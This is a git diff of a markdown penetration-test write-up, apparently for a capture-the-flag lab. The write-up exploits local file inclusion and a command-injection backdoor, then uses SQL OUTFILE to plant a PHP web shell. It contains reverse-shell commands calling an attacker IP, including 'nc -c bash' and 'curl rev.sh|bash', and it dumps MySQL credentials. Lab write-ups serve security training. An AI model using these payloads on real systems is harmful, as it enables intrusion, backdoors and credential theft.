@@ -163,7 +163,7 @@ The report has included below section in general for your references:
 
 Information gathering:
 
-As we been given the scope of engagement for Holo network 10.200.107.0/24, we will first performed basic network scan for host alive.
+As we been given the scope of engagement for Holo network (10.200.107.0/24), we will first performed basic network scan for host alive.
 
 <details><summary>nmap result</summary>
 
@@ -216,7 +216,7 @@ Host is up, received syn-ack (0.33s latency).
 
 </details>
 
-Once we identify the host, we perform a detail rustscan - in this case, the target of host which is alive is 10.200.107.33:
+Once we identify the host, we perform a detail rustscan - in this case, the target of host which is alive is ` 10.200.107.33 `:
 
 <details><summary>rustscan result</summary>
 
@@ -880,9 +880,14 @@ http://10.200.107.33/wp-login             (Status: 403) [Size: 278]
 From the rustscan result, we have quite a few details worth to check out.
 
 - robots.txt --- however it does not contain any useful information
+
 - we got hostname and domain --- ` holo.live ` and ` www.holo.live `
 
-Let's add the hostname and domain of our target into host file -> ` sudo sed -i.bak '$a10.200.107.33 holo.live www.holo.live' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts* `
+Let's add the hostname and domain of our target into host file
+
+```bash
+sudo sed -i.bak '$a10.200.107.33 holo.live www.holo.live' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts* 
+```
 
 We also fire up gobuster vhost scan to check if there is additional sub-domain can be found:
 
@@ -899,7 +904,11 @@ Found: gc._msdcs.holo.live (Status: 400) [Size: 422]
 
 </details>
 
-Seem like we found additional sub-domain available, let's add to our host file -> ` sudo sed -i.bak 's/$/ admin.holo.live dev.holo.live/' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts* `
+Seem like we found additional sub-domain available, let's add to our host file
+
+```bash
+sudo sed -i.bak 's/$/ admin.holo.live dev.holo.live/' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts*
+```
 
 Now we scan enumerate all the sub-domain, you may use basic gobuster dir scan, however since we know we can read robots text, in our case we speific gobuster to search with file extension.
 
@@ -998,7 +1007,7 @@ http://dev.holo.live/server-status        (Status: 403) [Size: 278]
 
 </details>
 
-From the gobuster result, we know that admin.holo.live do have robots.txt and it contain an interesting file called "creds.txt"
+From the gobuster result, we know that admin.holo.live does has ` robots.txt ` and it contain an interesting path to a file called "creds.txt"
 
 ```
 User-agent: *
@@ -1009,31 +1018,33 @@ Disallow: /var/www/admin/supersecretdir/creds.txt
 
 From here, we know probably we can retireve the file by exploiting Local File Inclusion vulnerability in PHP.
 
-However, we are unable to retrieve the file as admin.holo.live is a login page.
+However, we are unable to retrieve the file from admin.holo.live as it is a login page.
 
 Let's check out dev.holo.live, if the Local File Inclusion vulnerability can be found.
 
-Main page of dev.holo.live:
+This is the main page of dev.holo.live:
 
 ![dev.holo.live](dev.holo.live.png)
 
-Talent page of dev.holo.live:
+This is the talent page of dev.holo.live:
 
 ![talent-dev.holo.live](talent-dev.holo.live.png)
 
 ![talent-1-dev.holo.live](talent-1-dev.holo.live.png)
 
-Source for talent page of dev.holo.live:
+This is the source for the talent page of dev.holo.live:
 
 ![source-talent-dev.holo.live](source-talent-dev.holo.live.png)
 
-Looking at the source for talent page of dev.holo.live, we have notice there is a possibly of Local File Inclusion vulnerability --- ` img.php?file= `.
+Looking at the source for talent page of dev.holo.live, we have notice there is a possibly of Local File Inclusion vulnerability --- ` img.php?file= `
 
-Let's try out --- the payload we used -> ` http://dev.holo.live/img.php?file=../../../etc/passwd `:
+Let's try out --- the payload we used is ` http://dev.holo.live/img.php?file=../../../etc/passwd `
 
 ![lfi-img.php-dev.holo.live](lfi-img.php-dev.holo.live.png)
 
-Now, let's modified our payload -> ` http://dev.holo.live/img.php?file=../../../var/www/admin/supersecretdir/creds.txt `. This will allow us try to retreive the creds.txt stated in robots.txt of admin.holo.live as we know development environment usually is a repication of production environment.
+Now, let's modified our payload to ` http://dev.holo.live/img.php?file=../../../var/www/admin/supersecretdir/creds.txt `
+
+This will allow us try to retreive the ` creds.txt ` stated in ` robots.txt ` of admin.holo.live as we know development environment usually is a replication of production environment.
 
 ![creds-img.php-dev.holo.live](creds-img.php-dev.holo.live.png)
 
@@ -1041,19 +1052,27 @@ Now we get a credentials, let's try to login to admin.holo.live:
 
 ![login-success-admin.holo.live](login-success-admin.holo.live.png)
 
-Once we login, we check on the source of dashboard.php, right away we notice there is PHP Rmote Code Execution ([OWASP Command Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)) under the comment for "visitor visted today" --- ` <!-- //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->" `
+Once we login, we check on the source of dashboard.php, right away we notice there is PHP Rmote Code Execution ([OWASP Command Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)) under the comment for "visitor visted today"
 
-Let's try out --- the payload we used -> ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `:
+```php
+<!-- //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
+```
+
+Let's try out --- the payload we used is ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `
 
 ![rce-1-dashboard.php-admin.holo.live](rce-1-dashboard.php-admin.holo.live.png)
 
 ![rce-2-dashboard.php-admin.holo.live](rce-2-dashboard.php-admin.holo.live.png)
 
-Let's modofied our payload to get reverse shell -> ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `.
+Let's modofied our payload to get reverse shell to ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `
 
-We are using curl to perform this exploit to get our reverse shell -> ` curl http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `.
+We are using curl to perform this exploit to get our reverse shell
 
-Reverse shell - called back from admin.holo.live:
+```bash
+curl http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888
+```
+
+Reverse shell called back from admin.holo.live:
 
 ![reverse-shell-admin.holo.live](reverse-shell-admin.holo.live.png)
 
@@ -1065,7 +1084,7 @@ We found db_connect.php:
 
 ![db_connect.php-admin.holo.live](db_connect.php-admin.holo.live.png)
 
-We enumerated through /var/www and found user.txt:
+We enumerated through ` /var/www ` and found ` user.txt `:
 
 ![user.txt-1-admin.holo.live](user.txt-1-admin.holo.live.png)
 
@@ -1079,19 +1098,19 @@ find / -type f -name "*.dockerenv" -ls 2>/dev/null
 
 ![dockerenv-admin.holo.live](dockerenv-admin.holo.live.png)
 
-Since this is a docker container, we know that docker created docker network as internal network to connect diffirent container, we decided to check out the network information from current docker container by using ` ifconfig `.
+Since this is a docker container, we know that docker usually create docker network as internal network to connect diffirent containers, we decided to check out the network information from current docker container by using ` ifconfig `.
 
 ![ifconfig-admin.holo.live](ifconfig-admin.holo.live.png)
 
-From the netwoork information shown, we currently on 192.168.100.0/24 network which is inaccessible from Holo corporate network (10.200.107.0/24)
+From the netwoork information shown, we currently on ` 192.168.100.0/24 ` network which is inaccessible from Holo corporate network (10.200.107.0/24)
 
 We then check on  the routing information by using ` route -nv `
 
 ![route-admin.holo.live](route-admin.holo.live.png)
 
-From the routing, we know the gateway is 192.168.100.1
+From the routing, we know the gateway is ` 192.168.100.1 `
 
-Let's perform a quick port scanning on 192.168.100.1 leveraging the netcat binary available on current docker container.
+Let's perform a quick port scanning on ` 192.168.100.1 ` leveraging the netcat binary available on current docker container.
 
 ```bash
 for port in {1..20000}; do timeout 2 nc -znv 192.168.100.1 $port 2>&1 | grep open ; done
@@ -1099,57 +1118,101 @@ for port in {1..20000}; do timeout 2 nc -znv 192.168.100.1 $port 2>&1 | grep ope
 
 ![port-scan-192.168.100.1](port-scan-192.168.100.1.png)
 
-From the port scanning result, we know that there is mysql service running on 192.168.100.1, we may use the credential found previously (db_connect.php) to login into mysql server which reside on 192.168.100.1
+From the port scanning result, we know that there is mysql service running on ` 192.168.100.1 `, we may use the credential found previously (db_connect.php) to login into mysql server which reside on ` 192.168.100.1 `
 
 We can confirmed this by checking if mysql client connection is running on current docker container by using ` ps -elf | grep mysql `
 
 ![mysql-client-192.168.100.100](mysql-client-192.168.100.100.png)
 
-Let's login to mysql server on 192.168.100.1 by ` mysql -u admin -p -h 192.168.100.1 `
+Let's login to mysql server on ` 192.168.100.1 ` by ` mysql -u admin -p -h 192.168.100.1 `
 
 ![login-mysql-192.168.100.1](login-mysql-192.168.100.1.png)
 
 We then perform enumeration and information gathering from mysql server:
 
-- First, we check on the version of mysql server - ` SHOW VARIABLES LIKE “%version%”; `
+- First, we check on the version of mysql server --- ` SHOW VARIABLES LIKE “%version%”; `
 ![show-variable-version](show-variable-version.png)
 
-- Then we get the information of databases available - ` show databases; `
+- Then we get the information of databases available --- ` show databases; `
 ![show-databases](show-databases.png)
 
-- There is one database is not the defualt database created by mysql - ` DashbordDB `, we have selected this database to enumerate further
+- There is one database is not the default database created by mysql --- ` DashboardDB `, we have selected this database to enumerate further
 ![use-dashboarddb](use-dashboarddb.png)
 
-- We use ` show tables; ` to understand what are the tables available on this ` DashboardDb ` database and we found a user table, we have dump the enitre user table out.
+- We use ` show tables; ` to understand what are the tables available on this ` DashboardDB ` database and we found a user table, we have dump the enitre user table out.
 ![show-tables](show-tables.png)
 
+- We also dumping the user table from mysql database, as we know this is the table store the credentials of mysql by ` SELECT User FROM mysql.user; ` and ` ELECT host,User,authentication_string FROM mysql.user; `
+![user-mysql-1](user-mysql-1.png)
+![user-mysql-2](user-mysql-2.png)
+
+As we have the access to mysql server on ` 192.168.100.1 `, we can exploit the mysql server to escape current docker container and gain access to the host system.
+
+Here is the reference --- [Generate Backdoor via SQL Injection](http://scx020c07c.blogspot.com/2012/09/generate-backdoor-via-sql-injection.html)
+
+Below is the actions we perform to escape current docker container and gain access to the host system.
+
+- Create a table named "hacker" under the active database, in this case the active database is ` DashboardDB `, though we can also create our own database, however to ensure the access to the host system and being low-profile we going to use current active database.
+
+- Then we use "INSERT" statement to insert our php payload  --- ` <?php $cmd=$_GET[“cmd”];system($cmd);?> ` into the table just created.
+
+- Next, we use "SELECT" statement with "outfile" feature to dump the php payload to a file --- ` <?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php `
+
+- Last, we use "curl" command to get the response of our php to ensure our php payload is working properly --- ` curl 192.168.100.1:8080/shell.php?cmd=whoami `.
+
+Here is the full payload we used:
+
+```
+CREATE TABLE hacker ( hacker varchar(255) );
+
+INSERT INTO hacker (hacker) VALUES (‘<?php $cmd=$_GET[“cmd”];system($cmd);?>’);
+
+SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+
+curl 192.168.100.1:8080/shell.php?cmd=whoami
+```
+
+![generate-backdoor-via-sql-injection](generate-backdoor-via-sql-injection.png)
+
+We have the php working, we can craft and get reverse shell callback from host system to our attacker machine.
+
+First, we crafted a reverse shell bash script named "rev.sh" on our local attacker machine, you may find [this reference for reverse shell payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.50.103.20/23333 0>&1
+```
+
+![rev.sh-1](rev.sh-1.png)
+
+![rev.sh-2](rev.sh-2.png)
+
+Next, we spin up python web server allow target host system to get our reverse shell script --- ` pythom -m http.server 80 `
+
+![python-http-server](python-http-server.png)
+
+In the meantime, we aalso aspin up netcat listener to catch the callback from target host system --- ` sudo nc -lnvvp 23333 `
+
+![nc-2333](nc-23333.png)
+
+Now, back to our docker container system, using curl to allow 192.168.100.1 get our reverse shell script and execute it by bash.
+
+Below is the payload we used.
+
+```bash
+# This is the payload
+curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.103.20:80/rev.sh|bash &'
 
 
+# Then this is the payload with URL Encode to eliminate the issue of URl with space
+curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.20%3A80%2Frev.sh%7Cbash%20%26'
+```
 
+![curl-payload](curl-payload.png)
 
+Response of python web server on our attacker machines:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+![response-python-web-server](response-python-web-server.png)
 
 
 
